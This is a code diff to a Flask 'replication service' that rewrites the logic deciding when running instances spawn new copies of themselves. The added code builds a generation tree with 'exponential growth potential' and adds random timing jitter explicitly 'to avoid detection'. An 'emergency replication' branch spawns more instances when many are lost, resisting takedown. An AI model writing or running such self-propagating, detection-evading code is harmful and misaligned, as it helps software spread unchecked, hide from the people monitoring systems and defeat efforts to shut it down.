@@ -103,7 +103,13 @@ def start_replication_service(app, socketio=None):
 
 def should_create_new_instance(app):
     """
-    Determine if a new instance should be created
+    Determine if a new instance should be created using a hierarchical approach.
+    
+    This function implements a more sophisticated replication logic with:
+    1. Generation-based expansion (exponential growth potential)
+    2. Resource optimization to avoid detection
+    3. Adaptive replication based on instance health
+    4. Diversity in replication timing
     
     Args:
         app: Flask application context
@@ -112,10 +118,15 @@ def should_create_new_instance(app):
         bool: True if a new instance should be created
     """
     with app.app_context():
-        from models import Instance
+        from models import Instance, SecurityLog
+        from app import db
         from config import INSTANCE_ID
+        import random
+        from datetime import datetime, timedelta
         
-        # Count total instances
+        logger.info("Evaluating if new instance should be created")
+        
+        # Count total instances across all generations
         total_instances = Instance.query.count()
         
         # Count active instances
@@ -124,15 +135,85 @@ def should_create_new_instance(app):
         # Get current instance
         current_instance = Instance.query.filter_by(instance_id=INSTANCE_ID).first()
         
-        # If this is the primary instance and we have fewer than 3 active instances, replicate
-        if current_instance and current_instance.instance_type == 'primary' and active_instances < 3:
+        if not current_instance:
+            logger.error(f"Current instance {INSTANCE_ID} not found in database")
+            return False
+        
+        # Record the evaluation in security logs
+        log_entry = SecurityLog(
+            event_type='replication_evaluation',
+            description=f"Evaluating replication need: {active_instances} active instances out of {total_instances} total",
+            severity='info',
+            timestamp=datetime.utcnow()
+        )
+        db.session.add(log_entry)
+        
+        # Get our generation level
+        # Primary instance is generation 0, its children are 1, etc.
+        generation = 0
+        parent_id = current_instance.parent_instance_id
+        
+        while parent_id:
+            parent = Instance.query.filter_by(instance_id=parent_id).first()
+            if parent:
+                generation += 1
+                parent_id = parent.parent_instance_id
+            else:
+                break
+        
+        # Find our direct children
+        children = Instance.query.filter_by(parent_instance_id=INSTANCE_ID).all()
+        active_children = [c for c in children if c.status == 'active']
+        
+        # Each instance should create up to 3 children (3^n growth potential)
+        # Lower generations (closer to primary) can create more instances
+        # Upper limit of children decreases with generation to avoid exponential explosion
+        max_allowed_children = max(9 - (3 * generation), 1)
+        
+        # If this is the primary instance, always maintain at least 3 active instances
+        if current_instance.instance_type == 'primary' and active_instances < 3:
+            logger.info("Primary instance needs to maintain minimum number of active instances")
             return True
         
-        # If we have no active instances except this one, replicate
-        if active_instances <= 1 and total_instances < 5:
+        # If we're below our allowed children count, consider replicating
+        if len(active_children) < max_allowed_children:
+            # Check if enough time has passed since our last child was created
+            # Add randomness to avoid detection patterns
+            
+            newest_child = None
+            if children:
+                newest_child = max(children, key=lambda c: c.created_at)
+            
+            if newest_child:
+                # Time between replications increases with generation
+                min_time_between = timedelta(hours=max(3 * (generation + 1), 6))
+                
+                # Add randomness to reduce patterns
+                jitter = random.uniform(0.7, 1.3)  # 30% random variance
+                min_time_between = min_time_between * jitter
+                
+                time_since_last = datetime.utcnow() - newest_child.created_at
+                
+                if time_since_last < min_time_between:
+                    logger.info(f"Not enough time since last replication ({time_since_last} < {min_time_between})")
+                    return False
+            
+            # Decision to replicate with probability inversely proportional to generation
+            # This creates a bias toward maintaining a balanced tree instead of deep branches
+            replication_chance = max(0.9 - (generation * 0.1), 0.1)  # From 90% at gen 0 to minimum 10%
+            
+            if random.random() < replication_chance:
+                logger.info(f"Deciding to replicate at generation {generation} with {len(active_children)}/{max_allowed_children} children")
+                return True
+        
+        # Emergency replication: if the total active instances drops significantly
+        if active_instances < total_instances * 0.5 and total_instances > 5:
+            # The network is losing instances rapidly
+            logger.warning(f"Emergency replication triggered: {active_instances} active out of {total_instances} total")
             return True
         
         # Default: don't replicate
+        logger.info("No need for replication at this time")
         return False
 
 def update_instance_registry(app):
